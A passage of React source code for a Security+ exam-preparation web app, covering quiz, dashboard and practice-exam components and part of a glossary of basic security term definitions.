    if (correct) setScore(prev => prev + 1);
    setAnswers(prev => [...prev, { qId: q.id, selected, correct: q.correct, wasCorrect: correct }]);
    setSubmitted(true);
  };

  const handleNext = () => {
    if (currentQ < questions.length - 1) {
      setCurrentQ(prev => prev + 1);
      setSelected(null);
      setSubmitted(false);
    } else {
      setPhase('results');
    }
  };

  const handleComplete = () => {
    const percentage = Math.round((score / questions.length) * 100);
    const newProgress = { ...progress };
    if (!newProgress.quizProgress) newProgress.quizProgress = {};
    newProgress.quizProgress[`D${domain}`] = { score, total: questions.length, percentage, completedAt: new Date().toISOString() };
    setProgress(newProgress);
    saveProgress(newProgress);
    setView({ type: 'domain', domain });
  };

  if (phase === 'intro') {
    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <button onClick={() => setView({ type: 'domain', domain })} 
          style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
          ← Back to Domain {domain}
        </button>
        
        <Card style={{ textAlign: 'center' }}>
          <Badge color={color} style={{ marginBottom: 16 }}>Domain {domain}</Badge>
          <h2 style={{ marginBottom: 8 }}>Domain Quiz</h2>
          <p style={{ color: colors.textSecondary, marginBottom: 24 }}>10 random questions from {getDomainName(domain)}</p>
          <Button onClick={startQuiz} size="lg">Start Quiz</Button>
        </Card>
      </div>
    );
  }

  if (phase === 'results') {
    const percentage = Math.round((score / questions.length) * 100);
    const passed = percentage >= 85;
    
    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <Card style={{ textAlign: 'center', marginBottom: 24 }}>
          <div style={{ fontSize: 64, marginBottom: 16 }}>{passed ? '🎉' : '📚'}</div>
          <h2 style={{ color: passed ? colors.success : colors.warning }}>{passed ? 'Great Job!' : 'Keep Studying'}</h2>
          <p style={{ fontSize: 32, fontWeight: 700, marginTop: 12 }}>{score}/{questions.length}</p>
          <p style={{ color: colors.textSecondary }}>{percentage}%</p>
        </Card>
        <Button onClick={handleComplete} size="lg" style={{ width: '100%' }}>Complete Quiz</Button>
      </div>
    );
  }

  const q = questions[currentQ];

  return (
    <div style={{ padding: 24, maxWidth: 700, margin: '0 auto' }}>
      <div style={{ marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8, fontSize: 13, color: colors.textSecondary }}>
          <span>Question {currentQ + 1} of {questions.length}</span>
          <span>Score: {score}</span>
        </div>
        <ProgressBar value={currentQ + 1} max={questions.length} color={color} />
      </div>

      <Card style={{ marginBottom: 20 }}>
        <p style={{ fontWeight: 500, marginBottom: 20, fontSize: 16, lineHeight: 1.6 }}>{q.question}</p>
        
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {q.options.map((opt, i) => {
            let bg = colors.bgElevated, border = colors.border;
            if (submitted) {
              if (i === q.correct) { bg = `${colors.success}20`; border = colors.success; }
              else if (i === selected) { bg = `${colors.error}20`; border = colors.error; }
            } else if (i === selected) {
              bg = `${color}20`; border = color;
            }

            return (
              <button key={i} onClick={() => !submitted && setSelected(i)}
                style={{ padding: 12, background: bg, border: `2px solid ${border}`, borderRadius: 8, textAlign: 'left', cursor: submitted ? 'default' : 'pointer', color: colors.textPrimary }}>
                {opt}
              </button>
            );
          })}
        </div>
      </Card>

      {submitted && (
        <Card style={{ marginBottom: 20, borderLeft: `3px solid ${selected === q.correct ? colors.success : colors.error}` }}>
          <p style={{ color: colors.textSecondary, fontSize: 14 }}>{q.explanation}</p>
        </Card>
      )}

      <div style={{ display: 'flex', gap: 12 }}>
        {!submitted ? (
          <Button onClick={handleSubmit} disabled={selected === null} style={{ flex: 1 }}>Submit</Button>
        ) : (
          <Button onClick={handleNext} style={{ flex: 1 }}>
            {currentQ < questions.length - 1 ? 'Next Question' : 'View Results'}
          </Button>
        )}
      </div>
    </div>
  );
};


// ═══════════════════════════════════════════════════════════════
// HUB (MAIN LANDING)
// ═══════════════════════════════════════════════════════════════
const Hub = ({ progress, setView }) => {
  const domains = [1, 2, 3, 4, 5];
  const weights = { 1: 12, 2: 22, 3: 18, 4: 28, 5: 20 };

  const getDomainProgress = (domain) => {
    const lessons = LESSON_DATA.filter(l => l.domain === domain);
    const sims = SIMULATION_DATA.filter(s => s.domain === domain);
    const completedLessons = lessons.filter(l => progress.lessonProgress?.[l.id]?.completed).length;
    const completedSims = sims.filter(s => progress.simProgress?.[s.id]?.completed).length;
    const total = lessons.length + sims.length;
    const completed = completedLessons + completedSims;
    return { lessons: lessons.length, completedLessons, sims: sims.length, completedSims, total, completed, percent: total ? Math.round((completed / total) * 100) : 0 };
  };

  const totalProgress = domains.reduce((sum, d) => sum + getDomainProgress(d).completed, 0);
  const totalItems = domains.reduce((sum, d) => sum + getDomainProgress(d).total, 0);

  return (
    <div style={{ padding: 24, maxWidth: 1000, margin: '0 auto' }} className="slide-up">
      <div style={{ textAlign: 'center', marginBottom: 32 }}>
        <h1 style={{ fontSize: 28, fontWeight: 700, marginBottom: 8 }}>Security+ SY0-701 Training</h1>
        <p style={{ color: colors.textSecondary }}>Complete lessons and simulations to prepare for your certification</p>
        <div style={{ marginTop: 16 }}>
          <ProgressBar value={totalProgress} max={totalItems} color={colors.accent} height={10} />
          <p style={{ marginTop: 8, fontSize: 14, color: colors.textMuted }}>{totalProgress} of {totalItems} items completed ({totalItems ? Math.round((totalProgress / totalItems) * 100) : 0}%)</p>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: 16 }}>
        {domains.map(domain => {
          const dp = getDomainProgress(domain);
          const color = getDomainColor(domain);
          
          return (
            <Card key={domain} style={{ cursor: 'pointer', transition: 'transform 0.2s, border-color 0.2s', borderColor: 'transparent' }}
              onClick={() => setView({ type: 'domain', domain })}
              onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-4px)'; e.currentTarget.style.borderColor = color; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.borderColor = 'transparent'; }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 12 }}>
                <Badge color={color}>Domain {domain}</Badge>
                <span style={{ fontSize: 13, color: colors.textMuted }}>{weights[domain]}%</span>
              </div>
              <h3 style={{ fontSize: 16, marginBottom: 8 }}>{getDomainName(domain)}</h3>
              <div style={{ marginBottom: 12 }}>
                <ProgressBar value={dp.completed} max={dp.total} color={color} />
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13, color: colors.textSecondary }}>
                <span>📚 {dp.completedLessons}/{dp.lessons}</span>
                <span>🎮 {dp.completedSims}/{dp.sims}</span>
              </div>
            </Card>
          );
        })}
      </div>

      <div style={{ marginTop: 32, display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: 16 }}>
        <Button onClick={() => setView({ type: 'practice-exam' })} variant="secondary" size="lg" style={{ width: '100%' }}>
          📝 Practice Exam
        </Button>
        <Button onClick={() => setView({ type: 'dashboard' })} variant="secondary" size="lg" style={{ width: '100%' }}>
          📊 Dashboard
        </Button>
      </div>
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// DOMAIN VIEW
// ═══════════════════════════════════════════════════════════════
const DomainView = ({ domain, progress, setView }) => {
  const color = getDomainColor(domain);
  const lessons = LESSON_DATA.filter(l => l.domain === domain);
  const sims = SIMULATION_DATA.filter(s => s.domain === domain && s.type !== 'REM');
  const rems = SIMULATION_DATA.filter(s => s.domain === domain && s.type === 'REM');

  return (
    <div style={{ padding: 24, maxWidth: 900, margin: '0 auto' }} className="slide-up">
      <button onClick={() => setView({ type: 'hub' })} 
        style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
        ← Back to Hub
      </button>

      <div style={{ background: `linear-gradient(135deg, ${color}20, ${color}05)`, borderRadius: 12, padding: 24, marginBottom: 24, borderLeft: `4px solid ${color}` }}>
        <Badge color={color}>Domain {domain}</Badge>
        <h1 style={{ fontSize: 24, fontWeight: 700, marginTop: 8 }}>{getDomainName(domain)}</h1>
      </div>

      {/* Lessons Section */}
      <Card style={{ marginBottom: 20 }}>
        <h2 style={{ fontSize: 18, marginBottom: 16 }}>📚 Lessons ({lessons.length})</h2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {lessons.map(lesson => {
            const completed = progress.lessonProgress?.[lesson.id]?.completed;
            return (
              <button key={lesson.id} onClick={() => setView({ type: 'lesson', lessonId: lesson.id })}
                style={{ display: 'flex', alignItems: 'center', gap: 12, padding: 14, background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 8, cursor: 'pointer', textAlign: 'left', color: colors.textPrimary }}>
                <span style={{ fontSize: 20 }}>{completed ? '✅' : '📖'}</span>
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 500 }}>{lesson.title}</div>
                  <div style={{ fontSize: 13, color: colors.textMuted }}>{lesson.duration} • {lesson.sections?.length || 0} sections</div>
                </div>
                <span style={{ color: color }}>→</span>
              </button>
            );
          })}
        </div>
      </Card>

      {/* Simulations Section */}
      <Card style={{ marginBottom: 20 }}>
        <h2 style={{ fontSize: 18, marginBottom: 16 }}>🎮 Simulations ({sims.length})</h2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {sims.map(sim => {
            const completed = progress.simProgress?.[sim.id]?.completed;
            const passed = progress.simProgress?.[sim.id]?.passed;
            return (
              <button key={sim.id} onClick={() => setView({ type: 'simulation', simId: sim.id })}
                style={{ display: 'flex', alignItems: 'center', gap: 12, padding: 14, background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 8, cursor: 'pointer', textAlign: 'left', color: colors.textPrimary }}>
                <span style={{ fontSize: 20 }}>{completed ? (passed ? '✅' : '⚠️') : '🎮'}</span>
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 500 }}>{sim.title}</div>
                  <div style={{ fontSize: 13, color: colors.textMuted }}>{sim.time_estimate || '30-45 min'} • {sim.decision_points?.length || 0} decisions</div>
                </div>
                <span style={{ color: color }}>→</span>
              </button>
            );
          })}
        </div>
      </Card>

      {/* Remediation Section */}
      {rems.length > 0 && (
        <Card style={{ marginBottom: 20 }}>
          <h2 style={{ fontSize: 18, marginBottom: 16 }}>🔄 Remediation ({rems.length})</h2>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            {rems.map(sim => {
              const completed = progress.simProgress?.[sim.id]?.completed;
              return (
                <button key={sim.id} onClick={() => setView({ type: 'simulation', simId: sim.id })}
                  style={{ display: 'flex', alignItems: 'center', gap: 12, padding: 14, background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 8, cursor: 'pointer', textAlign: 'left', color: colors.textPrimary }}>
                  <span style={{ fontSize: 20 }}>{completed ? '✅' : '🔄'}</span>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontWeight: 500 }}>{sim.title}</div>
                    <div style={{ fontSize: 13, color: colors.textMuted }}>{sim.time_estimate || '30-40 min'}</div>
                  </div>
                  <span style={{ color: color }}>→</span>
                </button>
              );
            })}
          </div>
        </Card>
      )}

      {/* Domain Quiz */}
      <Card>
        <h2 style={{ fontSize: 18, marginBottom: 16 }}>📝 Domain Quiz</h2>
        <p style={{ color: colors.textSecondary, marginBottom: 16 }}>Test your knowledge with 10 random questions from this domain.</p>
        {progress.quizProgress?.[`D${domain}`] && (
          <p style={{ color: colors.textMuted, fontSize: 13, marginBottom: 12 }}>
            Last score: {progress.quizProgress[`D${domain}`].score}/{progress.quizProgress[`D${domain}`].total} ({progress.quizProgress[`D${domain}`].percentage}%)
          </p>
        )}
        <Button onClick={() => setView({ type: 'quiz', domain })}>Take Quiz</Button>
      </Card>
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════════════════════════════
const Dashboard = ({ progress, setView }) => {
  const domains = [1, 2, 3, 4, 5];

  const stats = useMemo(() => {
    const totalLessons = LESSON_DATA.length;
    const completedLessons = Object.values(progress.lessonProgress || {}).filter(p => p.completed).length;
    const totalSims = SIMULATION_DATA.length;
    const completedSims = Object.values(progress.simProgress || {}).filter(p => p.completed).length;
    const passedSims = Object.values(progress.simProgress || {}).filter(p => p.passed).length;
    
    return { totalLessons, completedLessons, totalSims, completedSims, passedSims };
  }, [progress]);

  return (
    <div style={{ padding: 24, maxWidth: 1000, margin: '0 auto' }} className="slide-up">
      <button onClick={() => setView({ type: 'hub' })} 
        style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
        ← Back to Hub
      </button>

      <h1 style={{ fontSize: 24, marginBottom: 24 }}>📊 Progress Dashboard</h1>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: 16, marginBottom: 32 }}>
        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 32, fontWeight: 700, color: colors.accent }}>{stats.completedLessons}</div>
          <div style={{ color: colors.textSecondary, fontSize: 13 }}>of {stats.totalLessons} Lessons</div>
        </Card>
        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 32, fontWeight: 700, color: colors.success }}>{stats.completedSims}</div>
          <div style={{ color: colors.textSecondary, fontSize: 13 }}>of {stats.totalSims} Simulations</div>
        </Card>
        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 32, fontWeight: 700, color: colors.warning }}>{stats.passedSims}</div>
          <div style={{ color: colors.textSecondary, fontSize: 13 }}>Simulations Passed</div>
        </Card>
        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 32, fontWeight: 700, color: colors.info }}>{(progress.practiceExams || []).length}</div>
          <div style={{ color: colors.textSecondary, fontSize: 13 }}>Practice Exams</div>
        </Card>
      </div>

      <Card style={{ marginBottom: 24 }}>
        <h2 style={{ fontSize: 18, marginBottom: 16 }}>Domain Progress</h2>
        {domains.map(domain => {
          const lessons = LESSON_DATA.filter(l => l.domain === domain);
          const sims = SIMULATION_DATA.filter(s => s.domain === domain);
          const completedL = lessons.filter(l => progress.lessonProgress?.[l.id]?.completed).length;
          const completedS = sims.filter(s => progress.simProgress?.[s.id]?.completed).length;
          const total = lessons.length + sims.length;
          const completed = completedL + completedS;
          const percent = total ? Math.round((completed / total) * 100) : 0;
          const color = getDomainColor(domain);

          return (
            <div key={domain} style={{ marginBottom: 16 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                <span style={{ fontWeight: 500 }}>Domain {domain}: {getDomainName(domain)}</span>
                <span style={{ color: colors.textMuted }}>{percent}%</span>
              </div>
              <ProgressBar value={completed} max={total} color={color} />
            </div>
          );
        })}
      </Card>

      {(progress.practiceExams || []).length > 0 && (
        <Card>
          <h2 style={{ fontSize: 18, marginBottom: 16 }}>Recent Practice Exams</h2>
          {(progress.practiceExams || []).slice(-5).reverse().map((exam, i) => (
            <div key={i} style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 0', borderBottom: i < 4 ? `1px solid ${colors.border}` : 'none' }}>
              <span style={{ color: colors.textSecondary }}>{new Date(exam.completedAt).toLocaleDateString()}</span>
              <span style={{ color: exam.percentage >= 85 ? colors.success : colors.warning }}>{exam.score}/{exam.total} ({exam.percentage}%)</span>
            </div>
          ))}
        </Card>
      )}
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// PRACTICE EXAM
// ═══════════════════════════════════════════════════════════════
const PracticeExam = ({ progress, setProgress, setView }) => {
  const [phase, setPhase] = useState('intro');
  const [questions, setQuestions] = useState([]);
  const [currentQ, setCurrentQ] = useState(0);
  const [selected, setSelected] = useState(null);
  const [answers, setAnswers] = useState([]);
  const [timeLeft, setTimeLeft] = useState(90 * 60);
  const [flagged, setFlagged] = useState(new Set());

  useEffect(() => {
    if (phase !== 'playing') return;
    if (timeLeft <= 0) {
      finishExam();
      return;
    }
    const timer = setInterval(() => setTimeLeft(t => t - 1), 1000);
    return () => clearInterval(timer);
  }, [phase, timeLeft]);

  const startExam = () => {
    // Weight questions by domain: D1=12%, D2=22%, D3=18%, D4=28%, D5=20%
    const weights = { 1: 11, 2: 20, 3: 16, 4: 25, 5: 18 }; // ~90 total
    let examQs = [];
    for (let d = 1; d <= 5; d++) {
      const domainQs = shuffleArray(QUESTIONS.filter(q => q.domain === d)).slice(0, weights[d]);
      examQs = [...examQs, ...domainQs];
    }
    setQuestions(shuffleArray(examQs));
    setPhase('playing');
  };

  const finishExam = () => {
    // Calculate score from answers
    const score = answers.filter((a, i) => a === questions[i]?.correct).length;
    const total = questions.length;
    const percentage = Math.round((score / total) * 100);
    
    const newProgress = { ...progress };
    if (!newProgress.practiceExams) newProgress.practiceExams = [];
    newProgress.practiceExams.push({ score, total, percentage, completedAt: new Date().toISOString() });
    setProgress(newProgress);
    saveProgress(newProgress);
    setPhase('results');
  };

  const formatTime = (seconds) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
  };

  if (phase === 'intro') {
    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <button onClick={() => setView({ type: 'hub' })} 
          style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
          ← Back to Hub
        </button>

        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 48, marginBottom: 16 }}>📝</div>
          <h2 style={{ marginBottom: 8 }}>Practice Exam</h2>
          <p style={{ color: colors.textSecondary, marginBottom: 16 }}>90 questions • 90 minutes • Domain-weighted</p>
          <div style={{ fontSize: 13, color: colors.textMuted, marginBottom: 24 }}>
            Questions weighted by exam: D1 (12%), D2 (22%), D3 (18%), D4 (28%), D5 (20%)
          </div>
          <Button onClick={startExam} size="lg">Start Exam</Button>
        </Card>
      </div>
    );
  }

  if (phase === 'results') {
    const score = answers.filter((a, i) => a === questions[i]?.correct).length;
    const percentage = Math.round((score / questions.length) * 100);
    const passed = percentage >= 85;

    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <Card style={{ textAlign: 'center', marginBottom: 24 }}>
          <div style={{ fontSize: 64, marginBottom: 16 }}>{passed ? '🎉' : '📚'}</div>
          <h2 style={{ color: passed ? colors.success : colors.warning }}>{passed ? 'Passed!' : 'Keep Studying'}</h2>
          <p style={{ fontSize: 36, fontWeight: 700, marginTop: 16 }}>{score}/{questions.length}</p>
          <p style={{ color: colors.textSecondary }}>{percentage}% (Passing: 85%)</p>
        </Card>
        <Button onClick={() => setView({ type: 'hub' })} size="lg" style={{ width: '100%' }}>Return to Hub</Button>
      </div>
    );
  }

  const q = questions[currentQ];

  return (
    <div style={{ padding: 24, maxWidth: 800, margin: '0 auto' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20, flexWrap: 'wrap', gap: 12 }}>
        <span style={{ fontWeight: 600 }}>Question {currentQ + 1} of {questions.length}</span>
        <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
          <span style={{ color: timeLeft < 600 ? colors.error : colors.textSecondary }}>⏱️ {formatTime(timeLeft)}</span>
          <Button onClick={finishExam} variant="secondary" size="sm">Finish Exam</Button>
        </div>
      </div>

      <ProgressBar value={currentQ + 1} max={questions.length} color={colors.accent} />

      <Card style={{ marginTop: 20, marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12 }}>
          <Badge color={getDomainColor(q.domain)}>Domain {q.domain}</Badge>
          <button onClick={() => setFlagged(prev => { const n = new Set(prev); n.has(currentQ) ? n.delete(currentQ) : n.add(currentQ); return n; })}
            style={{ background: 'none', border: 'none', cursor: 'pointer', fontSize: 18 }}>
            {flagged.has(currentQ) ? '🚩' : '⚑'}
          </button>
        </div>
        <p style={{ fontWeight: 500, marginBottom: 20, lineHeight: 1.6 }}>{q.question}</p>
        
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {q.options.map((opt, i) => {
            const isSelected = (answers[currentQ] ?? selected) === i;
            return (
              <button key={i} onClick={() => { setSelected(i); const newAnswers = [...answers]; newAnswers[currentQ] = i; setAnswers(newAnswers); }}
                style={{ padding: 12, background: isSelected ? `${colors.accent}20` : colors.bgElevated, border: `2px solid ${isSelected ? colors.accent : colors.border}`, borderRadius: 8, textAlign: 'left', cursor: 'pointer', color: colors.textPrimary }}>
                {opt}
              </button>
            );
          })}
        </div>
      </Card>

      <div style={{ display: 'flex', gap: 12 }}>
        <Button onClick={() => setCurrentQ(Math.max(0, currentQ - 1))} variant="secondary" disabled={currentQ === 0}>Previous</Button>
        <div style={{ flex: 1 }} />
        <Button onClick={() => setCurrentQ(Math.min(questions.length - 1, currentQ + 1))} disabled={currentQ === questions.length - 1}>Next</Button>
      </div>

      {/* Question navigator */}
      <div style={{ marginTop: 24, display: 'flex', flexWrap: 'wrap', gap: 6 }}>
        {questions.map((_, i) => (
          <button key={i} onClick={() => setCurrentQ(i)}
            style={{ width: 28, height: 28, borderRadius: 4, border: 'none', cursor: 'pointer', fontSize: 12, fontWeight: 500,
              background: i === currentQ ? colors.accent : answers[i] !== undefined ? colors.success : colors.bgElevated,
              color: i === currentQ || answers[i] !== undefined ? '#fff' : colors.textSecondary }}>
            {flagged.has(i) ? '🚩' : i + 1}
          </button>
        ))}
      </div>
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// MAIN APP
// ═══════════════════════════════════════════════════════════════
const App = () => {
  const [view, setView] = useState({ type: 'hub' });
  const [progress, setProgress] = useState(loadProgress);

  const renderView = () => {
    switch (view.type) {
      case 'hub':
        return <Hub progress={progress} setView={setView} />;
      case 'domain':
        return <DomainView domain={view.domain} progress={progress} setView={setView} />;
      case 'lesson':
        return <LessonViewer lessonId={view.lessonId} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'simulation':
        return <SimulationPlayer simId={view.simId} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'quiz':
        return <QuizPlayer domain={view.domain} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'dashboard':
        return <Dashboard progress={progress} setView={setView} />;
      case 'practice-exam':
        return <PracticeExam progress={progress} setProgress={setProgress} setView={setView} />;
      default:
        return <Hub progress={progress} setView={setView} />;
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: colors.bgPrimary }}>
      <NavBar view={view} setView={setView} progress={progress} />
      {renderView()}
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// GLOSSARY DATA (150+ Security Terms)
// ═══════════════════════════════════════════════════════════════
const GLOSSARY = {
  // Domain 1 Terms
  "CIA Triad": "The three core principles of information security: Confidentiality (preventing unauthorized disclosure), Integrity (preventing unauthorized modification), and Availability (ensuring authorized access when needed).",
  "Confidentiality": "Ensuring information is accessible only to authorized individuals. Protected through encryption, access controls, and data classification.",
  "Integrity": "Ensuring data has not been modified by unauthorized parties. Protected through hashing, digital signatures, and input validation.",
  "Availability": "Ensuring systems and data are accessible when needed by authorized users. Protected through redundancy, backups, and fault tolerance.",
  "Authentication": "The process of verifying the identity of a user, device, or system. Answers 'Who are you?'",
  "Authorization": "The process of determining what resources an authenticated entity can access. Answers 'What can you do?'",
  "Accounting": "The process of tracking and logging user activities for audit and compliance purposes. Answers 'What did you do?'",
  "MFA": "Multi-Factor Authentication - requiring two or more different types of authentication factors (knowledge, possession, inherence, location, behavior).",
  "Zero Trust": "Security model that assumes no implicit trust based on network location. Every access request must be verified regardless of source.",
  "Defense in Depth": "Security strategy using multiple overlapping layers of protection, so if one layer fails, others still provide security.",
  "Least Privilege": "Security principle of granting only the minimum access rights necessary for users to perform their job functions.",
  "Separation of Duties": "Control requiring multiple people to complete a critical task, preventing fraud by any single individual.",
  "AES": "Advanced Encryption Standard - symmetric encryption algorithm using 128, 192, or 256-bit keys. Current encryption standard.",
  "RSA": "Asymmetric encryption algorithm using public/private key pairs. Named after creators Rivest, Shamir, and Adleman.",
  "SHA-256": "Secure Hash Algorithm producing 256-bit hash values. Current standard for integrity verification.",
  "Digital Signature": "Cryptographic technique providing integrity, authentication, and non-repudiation by signing data with a private key.",
  "PKI": "Public Key Infrastructure - framework for managing digital certificates and public-key encryption.",
  "Certificate Authority": "Trusted entity that issues digital certificates, binding public keys to identities.",
  "Symmetric Encryption": "Encryption using the same key for both encryption and decryption. Fast but has key distribution challenges.",
  "Asymmetric Encryption": "Encryption using a key pair (public and private). Slower but solves key distribution problem.",
  "Hashing": "One-way function creating a fixed-size fingerprint of data. Any change produces completely different hash.",
  "Salt": "Random data added to passwords before hashing to prevent rainbow table attacks.",
  "TOTP": "Time-based One-Time Password - generates codes based on current time, typically changing every 30 seconds.",
  "HOTP": "HMAC-based One-Time Password - generates codes based on a counter value.",
  "FIDO2": "Phishing-resistant authentication standard using security keys. Credentials bound to specific websites.",
  "Biometrics": "Authentication using physical characteristics (fingerprint, face, iris) or behavioral patterns (typing, gait).",
  "FAR": "False Acceptance Rate - rate at which unauthorized users are incorrectly accepted. Security concern.",
  "FRR": "False Rejection Rate - rate at which authorized users are incorrectly rejected. Usability concern.",
  "CER": "Crossover Error Rate - point where FAR equals FRR. Lower CER indicates better biometric performance.",
  "Mantrap": "Physical security control allowing only one person through at a time, preventing tailgating.",
  "Honeypot": "Decoy system designed to attract and detect attackers. Any interaction is suspicious.",
  "Honeytoken": "Fake credentials or data that trigger alerts when used, indicating potential compromise.",
  "CAB": "Change Advisory Board - group responsible for reviewing and approving changes before implementation.",

  // Domain 2 Terms
  "APT": "Advanced Persistent Threat - sophisticated, long-term attack campaign typically by nation-state actors.",
  "Threat Actor": "Individual or group attempting to exploit vulnerabilities. Types include nation-states, organized crime, hacktivists, insiders.",
  "Attack Vector": "Path or method used by attackers to gain access to systems.",
  "Attack Surface": "Total of all points where an attacker could attempt to enter or extract data.",
  "Phishing": "Social engineering attack using fraudulent emails to trick users into revealing information or clicking malicious links.",
  "Spear Phishing": "Targeted phishing attack aimed at specific individuals using personalized information.",
  "Whaling": "Phishing attack targeting senior executives ('big fish').",
  "Vishing": "Voice phishing - social engineering attacks conducted via phone calls.",
  "Smishing": "SMS phishing - social engineering attacks via text messages.",
  "BEC": "Business Email Compromise - impersonating executives to trick employees into wire transfers or data disclosure.",
  "Pretexting": "Creating a false scenario to manipulate targets into revealing information.",
  "Malware": "Malicious software designed to damage, disrupt, or gain unauthorized access to systems.",
  "Virus": "Malware requiring a host file and user action to spread.",
  "Worm": "Self-propagating malware that spreads without user action by exploiting vulnerabilities.",
  "Trojan": "Malware disguised as legitimate software. Does not self-replicate.",
  "Ransomware": "Malware that encrypts files and demands payment for decryption. Double extortion adds data leak threat.",
  "Rootkit": "Malware that hides deep in systems at various levels (user, kernel, firmware, hypervisor).",
  "RAT": "Remote Access Trojan - malware giving attackers remote control over infected systems.",
  "Keylogger": "Spyware that records keystrokes to capture passwords and sensitive input.",
  "SQL Injection": "Attack inserting malicious SQL code into application queries to manipulate databases.",
  "XSS": "Cross-Site Scripting - attack injecting malicious scripts into web pages viewed by other users.",
  "CSRF": "Cross-Site Request Forgery - attack forcing authenticated users to perform unwanted actions.",
  "Buffer Overflow": "Attack exceeding buffer capacity to overwrite memory, potentially executing malicious code.",
  "DDoS": "Distributed Denial of Service - attack using multiple sources to overwhelm target resources.",
  "MITM": "Man-in-the-Middle - attack intercepting communications between two parties.",
  "ARP Poisoning": "Attack using fake ARP replies to redirect network traffic through attacker.",
  "DNS Spoofing": "Attack providing fake DNS responses to redirect users to malicious sites.",
  "Evil Twin": "Fake wireless access point with same SSID as legitimate network for MITM attacks.",
  "CVSS": "Common Vulnerability Scoring System - standardized severity ratings from 0-10.",
  "CVE": "Common Vulnerabilities and Exposures - unique identifiers for security vulnerabilities.",
  "IOC": "Indicator of Compromise - evidence that a system has been breached (file hashes, IPs, domains).",
  "IOA": "Indicator of Attack - behavioral evidence of an attack in progress.",
  "MITRE ATT&CK": "Framework mapping adversary tactics (goals) and techniques (methods).",
  "Cyber Kill Chain": "Model of attack stages: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions.",
  "STIX": "Structured Threat Information eXpression - format for sharing threat intelligence.",
  "TAXII": "Trusted Automated eXchange of Intelligence Information - protocol for sharing threat data.",

  // Domain 3 Terms
  "NGFW": "Next-Generation Firewall - combines traditional firewall with IPS, application awareness, and deep packet inspection.",
  "WAF": "Web Application Firewall - Layer 7 protection for web applications against SQLi, XSS, and other attacks.",
  "IDS": "Intrusion Detection System - monitors and alerts on suspicious activity (passive).",
  "IPS": "Intrusion Prevention System - monitors, detects, and blocks suspicious activity (inline).",
  "SIEM": "Security Information and Event Management - aggregates logs and correlates events for threat detection.",
  "SOAR": "Security Orchestration, Automation, and Response - automates incident response workflows.",
  "EDR": "Endpoint Detection and Response - behavioral detection and forensics on endpoints.",
  "XDR": "Extended Detection and Response - integrates detection across endpoints, network, cloud.",
  "VPN": "Virtual Private Network - encrypted tunnel for secure remote access.",
  "IPsec": "Internet Protocol Security - protocol suite for securing IP communications.",
  "TLS": "Transport Layer Security - protocol encrypting data in transit. TLS 1.3 is current standard.",
  "802.1X": "Port-based Network Access Control using RADIUS for authentication.",
  "RADIUS": "Remote Authentication Dial-In User Service - AAA protocol for network access.",
  "ZTNA": "Zero Trust Network Access - provides application-specific access rather than network-level VPN.",
  "DMZ": "Demilitarized Zone - network segment between external and internal networks for public-facing servers.",
  "VLAN": "Virtual LAN - logical network segmentation within physical network infrastructure.",
  "SDN": "Software-Defined Networking - separates control plane from data plane for flexible management.",
  "IaaS": "Infrastructure as a Service - cloud model where customer manages OS and up (e.g., EC2, Azure VMs).",
